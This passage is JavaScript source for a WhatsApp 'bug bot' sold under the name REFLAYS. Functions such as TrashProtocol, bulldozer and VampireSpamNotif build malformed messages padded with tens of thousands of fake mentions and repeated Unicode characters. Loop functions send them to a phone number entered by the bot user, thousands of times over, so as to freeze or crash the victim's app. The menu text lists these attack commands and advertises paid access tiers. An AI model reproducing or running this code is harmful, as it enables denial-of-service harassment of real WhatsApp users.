    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "𝗗𝗼𝗺𝗮𝗶𝗻 𝗘𝘅𝗽𝗲𝗻𝘀𝗶𝗼𝗻",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳ𝗥‌𝗬𝗨‌𝗜‌𝗖‌‌‌𝗛‌𝗜‌ᢶ⃟"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await asep.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await asep.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

async function TrashProtocol(target, mention) {
                const sex = Array.from({ length: 9741 }, (_, r) => ({
                       title: "꧀".repeat(9741),
                           rows: [`{ title: ${r + 1}, id: ${r + 1} }`]
                             }));
                             
                             const MSG = {
                             viewOnceMessage: {
                             message: {
                             listResponseMessage: {
                             title: "𝙍𝙀𝙁𝙇𝘼𝙔𝙎 𝙁𝙇𝙊𝙒𝙒",
                             listType: 2,
                             buttonText: null,
                             sections: sex,
                             singleSelectReply: { selectedRowId: "🇷🇺" },
                             contextInfo: {
                             mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                             participant: target,
                             remoteJid: "status@broadcast",
                             forwardingScore: 9741,
                             isForwarded: true,
                             forwardedNewsletterMessageInfo: {
                             newsletterJid: "9741@newsletter",
                             serverMessageId: 1,
                             newsletterName: "-"
                             }
                             },
                             description: "🇷🇺"
                             }
                             }
                             },
                             contextInfo: {
                             channelMessage: true,
                             statusAttributionType: 2
                             }
                             };

                             const msg = generateWAMessageFromContent(target, MSG, {});

                             await asep.relayMessage("status@broadcast", msg.message, {
                             messageId: msg.key.id,
                             statusJidList: [target],
                             additionalNodes: [
                             {
                             tag: "meta",
                             attrs: {},
                             content: [
                             {
                             tag: "mentioned_users",
                             attrs: {},
                             content: [
                             {
                             tag: "to",
                             attrs: { jid: target },
                             content: undefined
                             }
                             ]
                             }
                             ]
                             }
                             ]
                             });

                             if (mention) {
                             await asep.relayMessage(
                             target,
                             {
                             statusMentionMessage: {
                             message: {
                             protocolMessage: {
                             key: msg.key,
                             type: 25
                             }
                             }
                             }
                             },
                             {
                additionalNodes: [
                    {
                       tag: "meta",
                           attrs: { is_status_mention: "AryaRyuigichi is back ▾" },
                             content: undefined
}
]
}
);
}
}

async function bulldozer(target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await asep.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function VampireSpamNotif(target, Ptcp = true) {
  await asep.relayMessage(target, {
      groupMentionedMessage: {
          message: {
              interactiveMessage: {
                  header: {
                      documentMessage: {
                          url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                          mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                          fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                          fileLength: "9999999999999999",
                          pageCount: 0x9184e729fff,
                          mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                          fileName: "𖤐 𝗗𝗼𝗺𝗮𝗶𝗻 𝗘𝘅𝗽𝗲𝗻𝘀𝗶𝗼𝗻 𖤐",
                          fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                          directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                          mediaKeyTimestamp: "1715880173",
                          contactVcard: true
                      },
                      title: "𖤐 𝗗𝗼𝗺𝗮𝗶𝗻 𝗘𝘅𝗽𝗲𝗻𝘀𝗶𝗼𝗻 𖤐" ,
                      hasMediaAttachment: true
                  },
                  body: {
                      text: "ꦽ".repeat(50000) + "_*~@8~*_\n".repeat(50000) + '@8'.repeat(50000),
                  },
                  nativeFlowMessage: {},
                  contextInfo: {
                      mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                      groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                  }
              }
          }
      }
  }, { participant: { jid: target } }, { messageId: null });
}

async function necroxeneasy(target) {
  for (let i = 0; i < 10000; i++) {
await protocolbug3(target)
await protocolbug3(target)
await protocolbug3(target)
await protocolbug4(target)
await protocolbug4(target)
await protocolbug4(target)
await protocolbug5(target)
await protocolbug5(target)
await sleep(3000)
}
}

async function necroxenbull(target) {
  for (let i = 0; i < 50000; i++) {
await bulldozer(target)
await bulldozer(target)
await bulldozer(target)
}
}

async function necroxenperma(target) {
  for (let i = 0; i < 10000; i++) {
await TrashProtocol(target)
await TrashProtocol(target)
await TrashProtocol(target)
await protocolbug4(target)
await protocolbug4(target)
await protocolbug4(target)
await protocolbug5(target)
await protocolbug5(target)
await protocolbug5(target)
await VampBroadcast(target, mention = true)
await VampBroadcast(target, mention = true)
await VampBroadcast(target, mention = true)
await sleep(3000)
}
}

async function necroxenui(target) {
  for (let i = 0; i < 1000; i++) {
await VampireSpamNotif(target, Ptcp = true)
await VampireSpamNotif(target, Ptcp = true)
await VampireSpamNotif(target, Ptcp = true)
await sleep(3000)
await VampBroadcast(target, mention = true)
await VampBroadcast(target, mention = true)
await VampBroadcast(target, mention = true)
await sleep(3000)
await TrashProtocol(target)
await TrashProtocol(target)
await TrashProtocol(target)
await sleep(3000)
await protocolbug5(target)
await protocolbug5(target)
await protocolbug5(target)
await sleep(3000)
}
}

switch (command) {
case 'menu': {
    // Kirim reaksi
    await asep.sendMessage(from, {
        react: {
            text: "👻",
            key: m.key
        }
    });

    let menu = `👋 hai *${senderName}*, 
ɪ'ᴍ ʀᴇꜰʟᴀʏ x ᴢᴀɴɴ ʙᴏᴛ ᴅᴇɢɪꜱɴᴇᴅ ᴛᴏ ʜᴇʟᴘ ᴜꜱᴇ ᴏʀ ꜱᴇɴᴅ ᴛʜᴇ ʟᴀᴛᴇꜱᴛ ᴡʜᴀᴛꜱᴀᴘᴘ ᴠᴇʀꜱɪᴏɴ
┏━〔 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐒𝐂 𝐑𝐄𝐅𝐋𝐀𝐘 〕 ━┓
╏ 
╏ 𝘽𝙊𝙏 𝙉𝘼𝙈𝙀 : 𝐑𝐄𝐅𝐋𝐀𝐘𝐒 𝐍𝐄𝐖 𝐄𝐑𝐀
╏ 𝚄𝚜𝚎𝚛𝚜 : *${senderName}*
╏𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍 : wa.me/6285377269819
╏ 𝚅𝚎𝚛𝚜𝚒𝚘𝚗 :  *1.0 VIP*
╏ 𝚁𝚞𝚗𝚝𝚒𝚖𝚎 𝙱𝚘𝚝 :  *${runtime(process.uptime())}*
┗━━━━━━━━━━━━━━━━━━━┛

╰𝘚𝘌𝘓𝘌𝘊𝘛 𝘛𝘖 𝘉𝘜𝘛𝘛𝘖𝘕`;

    // Kirim gambar + tombol dulu
    await asep.sendMessage(m.chat, {
        image: { url: "https://files.catbox.moe/ctsxpn.jpg" },
        caption: menu,
        buttons: [
            { buttonId: ".bugmenu", buttonText: { displayText: '𝗕𝘂𝗴 𝗠𝗲𝗻𝘂 𝐑𝐄𝐅𝐋𝐀𝐘𝐒 𝐍𝐄𝐖 𝐄𝐑𝐀 〄' } },
            { buttonId: ".allmenu", buttonText: { displayText: '𝗔𝗹𝗹 𝗠𝗲𝗻𝘂 〄' } },
            { buttonId: ".script", buttonText: { displayText: '𝗦𝗰𝗿𝗶𝗽𝘁 𝗥𝗘𝗙𝗟𝗔𝗬𝗦 𝗙𝗟𝗢𝗪 ⌦' } },
        ],
        viewOnce: false,
        headerType: 6,
        mentions: [sender],
    }, { quoted: qkontak });

    // Lalu kirim audio
    const soundPath = path.join('media', 'menu.mp3');
    if (fs.existsSync(soundPath)) {
        await asep.sendMessage(m.chat, {
            audio: fs.readFileSync(soundPath),
            mimetype: 'audio/mpeg',
            ptt: true
        }, { quoted: qkontak });
    } else {
        console.log("❌ File audio tidak ditemukan:", soundPath);
    }
}
break;


case 'allmenu':{ 
    asep.sendMessage(from, {
        react: { 
            text: "🥵",
            key: m.key 
        } 
    });

    let menu = `👋 hai *${senderName}*, 
ɪ'ᴍ ʀᴇꜰʟᴀʏ x ᴢᴀɴɴ ʙᴏᴛ ᴅᴇɢɪꜱɴᴇᴅ ᴛᴏ ʜᴇʟᴘ ᴜꜱᴇ ᴏʀ ꜱᴇɴᴅ ᴛʜᴇ ʟᴀᴛᴇꜱᴛ ᴡʜᴀᴛꜱᴀᴘᴘ ᴠᴇʀꜱɪᴏɴ

┏━〔 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐒𝐂 𝐑𝐄𝐅𝐋𝐀𝐘 〕 ━┓
╏ 
╏ 𝘽𝙊𝙏 𝙉𝘼𝙈𝙀 : 𝐑𝐄𝐅𝐋𝐀𝐘𝐒 𝐍𝐄𝐖 𝐄𝐑𝐀
╏ 𝚄𝚜𝚎𝚛𝚜 : *${senderName}*
╏𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍 : wa.me/6285377269819
╏ 𝚅𝚎𝚛𝚜𝚒𝚘𝚗 :  *1.0 VIP*
╏ 𝚁𝚞𝚗𝚝𝚒𝚖𝚎 𝙱𝚘𝚝 :  *${runtime(process.uptime())}*
┗━━━━━━━━━━━━━━━━━━━┛
┏────────────────────❐
│ 「 𝗕𝘂𝗴 𝗠𝗲𝗻𝘂
│ .reflay-easy ( Essay To Delay ) 
│ .hard-delay-reflay ( Hard Delay Parah ) 
│ .reflayxui ( Not All Device Work )
│ .crazy-delay ( Crazy Delay Target )
│
│ 「 𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂 」
│ .addprem
│ .delprem
│ .addowner
│ .delowner
│
│ 「 𝗧𝗼𝗼𝗹𝘀 𝗠𝗲𝗻𝘂 」
│ .tt
│ .cquote
│ .tourl
│ .reactch/rch
│ .brat
│ .tqto
│ .ht
╰────────────────────❏`

    await asep.sendMessage(m.chat, {
        image: { url: "https://files.catbox.moe/ctsxpn.jpg" },
        caption: menu,
        buttons: [
            {
                buttonId: ".bugmenu", 
                buttonText: {
                    displayText: '𝗕𝘂𝗴 𝗠𝗲𝗻𝘂  〄'
                }
            },
            {
                buttonId: ".tqto", 
                buttonText: {
                    displayText: '𝗔𝗹𝗹 𝗦𝘂𝗽𝗽𝗼𝗿𝘁 ⌥'
                }
            },
            {
                buttonId: ".script", 
                buttonText: {
                    displayText: '𝗦𝗰𝗿𝗶𝗽𝘁 REFLAY ⌦'
                }
            },
        ],
        viewOnce: false,
        headerType: 6,
        mentions: [sender],
    }, { quoted: qkontak });
    const soundPath = path.join('media', 'menu.mp3');
    if (fs.existsSync(soundPath)) {
        await asep.sendMessage(m.chat, {
            audio: fs.readFileSync(soundPath),
            mimetype: 'audio/mpeg',
            ptt: true
        }, { quoted: qkontak });
    } else {
        console.log("❌ File audio tidak ditemukan:", soundPath);
    }
}
break

case 'bugmenu':{
    asep.sendMessage(from, {
        react: { text: "🥱",
                key: m.key 
               } 
            }
        );
let menu = `👋 Hai *${senderName}*, 
ɪ'ᴍ ʀᴇꜰʟᴀʏ x ᴢᴀɴɴ ʙᴏᴛ ᴅᴇɢɪꜱɴᴇᴅ ᴛᴏ ʜᴇʟᴘ ᴜꜱᴇ ᴏʀ ꜱᴇɴᴅ ᴛʜᴇ ʟᴀᴛᴇꜱᴛ ᴡʜᴀᴛꜱᴀᴘᴘ ᴠᴇʀꜱɪᴏɴ
┏━〔 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐒𝐂 𝐑𝐄𝐅𝐋𝐀𝐘 〕 ━┓
╏ 
╏ 𝘽𝙊𝙏 𝙉𝘼𝙈𝙀 : 𝐑𝐄𝐅𝐋𝐀𝐘𝐒 𝐍𝐄𝐖 𝐄𝐑𝐀
╏ 𝚄𝚜𝚎𝚛𝚜 : *${senderName}*
╏𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍 : wa.me/6285377269819
╏ 𝚅𝚎𝚛𝚜𝚒𝚘𝚗 :  *1.0 VIP*
╏ 𝚁𝚞𝚗𝚝𝚒𝚖𝚎 𝙱𝚘𝚝 :  *${runtime(process.uptime())}*
┗━━━━━━━━━━━━━━━━━━━┛

 「 𝗕𝘂𝗴 𝗠𝗲𝗻𝘂
┏────────────────────❐
│ 「 𝗕𝘂𝗴 𝗠𝗲𝗻𝘂
│ .reflay-easy ( Essay To Delay ) 
│ .hard-delay-reflay ( Hard Delay Parah ) 
│ .reflayxui ( Not All Device Work )
│ .crazy-delay ( Crazy Dela
`
await asep.sendMessage(m.chat, {
image: {
url: "https://files.catbox.moe/ctsxpn.jpg"
},
caption: menu,
buttons: [
{
buttonId: ".allmenu", 
buttonText: {
displayText: '𝗔𝗹𝗹 𝗠𝗲𝗻𝘂 〄'
}
},
{
buttonId: ".tqto", 
buttonText: {
displayText: 'THANKS TO REFLAY ⌥'
}
  },
  {
buttonId: ".script", 
buttonText: {
displayText: '𝗦𝗰𝗿𝗶𝗽𝘁 𝗥𝗘𝗙𝗟𝗔𝗬𝗦 𝗙𝗟𝗢𝗪 ⌦'
}
},
],
   viewOnce: false,
   headerType: 6,
   mentions: [sender],
   }, { quoted: qkontak });

   const soundPath = path.join('media', 'menu.mp3');
    if (fs.existsSync(soundPath)) {
        await asep.sendMessage(m.chat, {
            audio: fs.readFileSync(soundPath),
            mimetype: 'audio/mpeg',
            ptt: true
        }, { quoted: qkontak });
    } else {
        console.log("❌ File audio tidak ditemukan:", soundPath);
    }
}
break

case 'tqto':{
    asep.sendMessage(from, {
        react: { text: "👽",
                key: m.key 
               } 
            }
        );
let menu = `
👋 hai *${senderName}*, 
ɪ'ᴍ ʀᴇꜰʟᴀʏ x ᴢᴀɴɴ ʙᴏᴛ ᴅᴇɢɪꜱɴᴇᴅ ᴛᴏ ʜᴇʟᴘ ᴜꜱᴇ ᴏʀ ꜱᴇɴᴅ ᴛʜᴇ ʟᴀᴛᴇꜱᴛ ᴡʜᴀᴛꜱᴀᴘᴘ ᴠᴇʀꜱɪᴏɴ

┏━〔 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐒𝐂 𝐑𝐄𝐅𝐋𝐀𝐘 〕 ━┓
╏ 
╏ 𝘽𝙊𝙏 𝙉𝘼𝙈𝙀 : 𝐑𝐄𝐅𝐋𝐀𝐘𝐒 𝐍𝐄𝐖 𝐄𝐑𝐀
╏ 𝚄𝚜𝚎𝚛𝚜 : *${senderName}*
╏𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍 : wa.me/6285377269819
╏ 𝚅𝚎𝚛𝚜𝚒𝚘𝚗 :  *1.0 VIP*
╏ 𝚁𝚞𝚗𝚝𝚒𝚖𝚎 𝙱𝚘𝚝 :  *${runtime(process.uptime())}*
┗━━━━━━━━━━━━━━━━━━━┛

╭──⧼ 𝗠𝘆 𝗦𝘂𝗽𝗽𝗼𝗿𝘁 ⧽──
│Fatr ( 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 )
│Sanzz ( BABU )
│Renna ( My Life )
│Fley ( Support )
╰───────────`
await asep.sendMessage(m.chat, {
image: {
url: "https://files.catbox.moe/ctsxpn.jpg"
},
caption: menu,
buttons: [
{
buttonId: ".allmenu", 
buttonText: {
displayText: '𝗔𝗹𝗹 𝗠𝗲𝗻𝘂 〄'
}
},
{
buttonId: ".tqto", 
buttonText: {
displayText: '𝗔𝗹𝗹 𝗦𝘂𝗽𝗽𝗼𝗿𝘁 𝗥𝗘𝗙𝗟𝗔𝗬𝗦 ⌥'
}
  },
  {
buttonId: ".script", 
buttonText: {
displayText: '𝗦𝗰𝗿𝗶𝗽𝘁 𝗥𝗘𝗙𝗟𝗔𝗬𝗦 ⌦'
}
},
],
   viewOnce: false,
   headerType: 6,
   mentions: [sender],
   }, { quoted: qkontak });
   
   const soundPath = path.join('media', 'menu.mp3');
    if (fs.existsSync(soundPath)) {
        await asep.sendMessage(m.chat, {
            audio: fs.readFileSync(soundPath),
            mimetype: 'audio/mpeg',
            ptt: true
        }, { quoted: qkontak });
    } else {
        console.log("❌ File audio tidak ditemukan:", soundPath);
    }
}
break

case 'sc':
case 'script':{
    asep.sendMessage(from, {
        react: { text: "😜",
                key: m.key 
               } 
            }
        );
let menu = `
👋 hai *${senderName}*, 
ɪ'ᴍ ʀᴇꜰʟᴀʏ x ᴢᴀɴɴ ʙᴏᴛ ᴅᴇɢɪꜱɴᴇᴅ ᴛᴏ ʜᴇʟᴘ ᴜꜱᴇ ᴏʀ ꜱᴇɴᴅ ᴛʜᴇ ʟᴀᴛᴇꜱᴛ ᴡʜᴀᴛꜱᴀᴘᴘ ᴠᴇʀꜱɪᴏɴ

┏━〔 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐒𝐂 𝐑𝐄𝐅𝐋𝐀𝐘 〕 ━┓
╏ 
╏ 𝘽𝙊𝙏 𝙉𝘼𝙈𝙀 : 𝐑𝐄𝐅𝐋𝐀𝐘𝐒 𝐍𝐄𝐖 𝐄𝐑𝐀
╏ 𝚄𝚜𝚎𝚛𝚜 : *${senderName}*
╏𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍 : wa.me/6285377269819
╏ 𝚅𝚎𝚛𝚜𝚒𝚘𝚗 :  *1.0 VIP*
╏ 𝚁𝚞𝚗𝚝𝚒𝚖𝚎 𝙱𝚘𝚝 :  *${runtime(process.uptime())}*
┗━━━━━━━━━━━━━━━━━━━┛
Script REFLAYS V1.0 VVIP
ENC : 15K
RESELLER : 30K
OWNER : 50K 
PARTNER : 70K ( DAPAT NO ENC FULL ) 
BUY TO SCRIPT?
HUB DEVELOPER : wa.me/6285377269819
Chanel Script ini: https://whatsapp.com/channel/0029VbAJy2SDJ6H6HCOH5s30
`
await asep.sendMessage(m.chat, {
image: {
url: "https://files.catbox.moe/ctsxpn.jpg"
},
caption: menu,
buttons: [
{
buttonId: ".allmenu", 
buttonText: {
displayText: '𝗔𝗹𝗹 𝗠𝗲𝗻𝘂 〄'
}
},
{
buttonId: ".tqto", 
buttonText: {
displayText: '𝗔𝗹𝗹 𝗦𝘂𝗽𝗽𝗼𝗿𝘁 𝗥𝗘𝗙𝗟𝗔𝗬𝗦 ⌥'
}
  },
  {
buttonId: ".script", 
buttonText: {
displayText: '𝗦𝗰𝗿𝗶𝗽𝘁 𝗥𝗘𝗙𝗟𝗔𝗬𝗦 ⌦'
}
},
],
   viewOnce: false,
   headerType: 6,
   mentions: [sender],
   }, { quoted: qkontak });
   
   const soundPath = path.join('media', 'menu.mp3');
    if (fs.existsSync(soundPath)) {
        await asep.sendMessage(m.chat, {
            audio: fs.readFileSync(soundPath),
            mimetype: 'audio/mpeg',
            ptt: true
        }, { quoted: qkontak });
    } else {
        console.log("❌ File audio tidak ditemukan:", soundPath);
    }
}
break

case 'owner': case "fatir": case 'fatr': {
await asep.sendMessage(m.chat, { react: { text: "💀",key: m.key,}}); 
let menu = `
*\`𝗖𝗿𝗲𝗮𝘁𝗼𝗿 𝗦𝗰𝗿𝗶𝗽𝘁\`*`
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterName: `REFLAYS NEW ERA`,
 newsletterJid: "120363421566496745@newsletter",
 serverMessageId: 143
},
 businessMessageForwardInfo: { businessOwnerJid: asep.decodeJid(asep.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: "𝗢𝘄𝗻𝗲𝗿𝗦𝗰𝗿𝗶𝗽𝘁"
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: "REFLAYS V 1.0 VIP"
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: ``,
 subtitle: "",
 hasMediaAttachment: true,
 ...(await prepareWAMessageMedia({ image: yuda }, { upload: asep.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"𝗢𝘄𝗻𝗲𝗿\",\"url\":\"https://wa.me/6285377269819\",\"merchant_url\":\"https://wa.me/6285377269819\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"𝗦𝗮𝗹𝘂𝗿𝗮𝗻𝗗𝗲𝘃\",\"url\":\"https://whatsapp.com/channel/0029VbAJy2SDJ6H6HCOH5s30\",\"merchant_url\":\"https://wa.me/6285377269819\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶𝗦𝗰𝗿𝗶𝗽𝘁\",\"url\":\"https://whatsapp.com/channel/0029VbAJy2SDJ6H6HCOH5s30\",\"merchant_url\":\"https://wa.me/6285377269819\"}`
}],
 })
 })
 }
 }
}, {})

await asep.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
break

// ~~~~~~~~~ CASE BUG ~~~~~~~~~~//
case 'reflay-easy':
case 'xendelaynormal': {
  if (!isPremium) return necroxenreply('⚡︎ Fitur khusus Premium!');
  if (!isOwner) return necroxenreply('⚡︎ Fitur khusus Owner!');

  if (!q) return m.reply(`Contoh: ${prefix + command} 62xxxx`);
  const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  const pureTarget = target.split("@")[0]; // Ambil hanya angkanya

  if (blockedNum.includes(pureTarget)) return m.reply("mau ngapain bug dev dek 😹")

  const prosesText = `╔═━━「 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 𝐁𝐔𝐆 」━━═╗
┋ Target: wa.me/${target.split('@')[0]}
┋ Status: ⏳ Mengirim bug *${prefix + command}*
╚════════════════════╝`;

  await asep.sendMessage(m.chat, {
    video: fs.readFileSync('./media/bug.mp4'),
    caption: prosesText,
    gifPlayback: true,
  }, { quoted: qkontak });

  for (let i = 0; i <  50; i++) {
    await necroxeneasy(target)
    await sleep(1000)
}


  const selesaiText = `╔═━━「 𝗦𝘂𝗰𝗰𝗲𝘀 𝗕𝘂𝗴 」━━═╗
┋ Target: wa.me/${target.split('@')[0]}
┋ Status: ✅ Berhasil mengirim bug *${prefix + command}*
┋ Note: Jeda Agar Sender Tidak Kenon !
╚═════════════════╝`;

  await asep.sendMessage(m.chat, {
    video: fs.readFileSync('./media/bug.mp4'),
    caption: selesaiText,
    gifPlayback: true,
  }, { quoted: qkontak });
}
break;

case 'hard-delay-reflay':
case 'fatir-delay-perma': {
  if (!isPremium) return necroxenreply('⚡︎ Fitur khusus Premium!');
  if (!isOwner) return necroxenreply('⚡︎ Fitur khusus Owner!');

  if (!q) return m.reply(`Contoh: ${prefix + command} 62xxxx`);
  const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  const pureTarget = target.split("@")[0]; // Ambil hanya angkanya

  if (blockedNum.includes(pureTarget)) return m.reply("mau ngapain bug dev dek 😹")

  const prosesText = `╔═━━「 𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴𝘀 」━━═╗
┋ Target: wa.me/${target.split('@')[0]}
┋ Status: ⏳ Mengirim bug *${prefix + command}*
╚════════════════════╝`;

  await asep.sendMessage(m.chat, {
    video: fs.readFileSync('./media/bug.mp4'),
    caption: prosesText,
    gifPlayback: true,
  }, { quoted: qkontak });

  for (let i = 0; i <  100; i++) {
    await necroxenperma(target)
    await sleep(1000)
}


  const selesaiText = `╔═━━「 𝗦𝘂𝗰𝗰𝗲𝘀 𝗕𝘂𝗴𝘀 」━━═╗
┋ Target: wa.me/${target.split('@')[0]}
┋ Status: ✅ Berhasil mengirim bug *${prefix + command}*
┋ Note: Jeda Agar Sender Tidak Kenon !
╚═════════════════╝`;

  await asep.sendMessage(m.chat, {
    video: fs.readFileSync('./media/bug.mp4'),
    caption: selesaiText,
    gifPlayback: true,
  }, { quoted: qkontak });
}
break;


case 'reflayxui':
case 'reflay': {
  if (!isPremium) return necroxenreply('⚡︎ Fitur khusus Premium!');
  if (!isOwner) return necroxenreply('⚡︎ Fitur khusus Owner!');

  if (!q) return m.reply(`Contoh: ${prefix + command} 62xxxx`);
  const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  const pureTarget = target.split("@")[0]; // Ambil hanya angkanya

  if (blockedNum.includes(pureTarget)) return m.reply("mau ngapain bug dev dek 😹");

  const prosesText = `╔═━━「 𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴𝘀 」━━═╗
┋ Target: wa.me/${target.split('@')[0]}
┋ Status: ⏳ Mengirim bug *${prefix + command}*
╚════════════════════╝`;

  await asep.sendMessage(m.chat, {
